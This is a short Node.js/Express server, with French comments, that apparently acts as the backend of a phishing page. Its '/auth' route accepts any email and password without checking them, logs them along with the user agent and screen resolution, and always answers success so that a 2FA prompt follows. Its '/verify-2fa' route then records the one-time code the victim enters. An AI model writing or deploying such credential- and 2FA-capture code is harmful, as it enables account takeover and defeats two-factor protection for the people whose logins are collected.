const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const app = express();

// Middleware
app.use(express.json());
app.use((req, res, next) => {
  res.header('Content-Security-Policy', "default-src 'self'");
  next();
});

// Route de login
app.post('/auth', (req, res) => {
  const { email, password, userAgent, screenRes } = req.body;
  
  const logData = {
    timestamp: new Date().toISOString(),
    ip: req.ip,
    email,
    password: crypto.createHash('sha256').update(password).digest('hex'),
    userAgent,
    screenRes,
    status: 'pending_2fa'
  };

  saveEncryptedLog(logData);
  res.sendStatus(200); // Réponse positive pour déclencher le 2FA
});

// Route 2FA
app.post('/verify-2fa', (req, res) => {
  const { email, code } = req.body;
  
  const logData = {
    timestamp: new Date().toISOString(),
    ip: req.ip,
    email,
    code,
    status: 'completed'
  };

  saveEncryptedLog(logData);
  res.sendStatus(200);
});

function saveEncryptedLog(data) {
  const cipher = crypto.createCipheriv(
    'aes-256-cbc', 
    process.env.SECRET_KEY, 
    process.env.IV
  );
  
  let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  fs.appendFileSync('./logs/auth.enc', encrypted + '\n');
}

app.listen(3333, () => console.log('Server running on port 3333'));
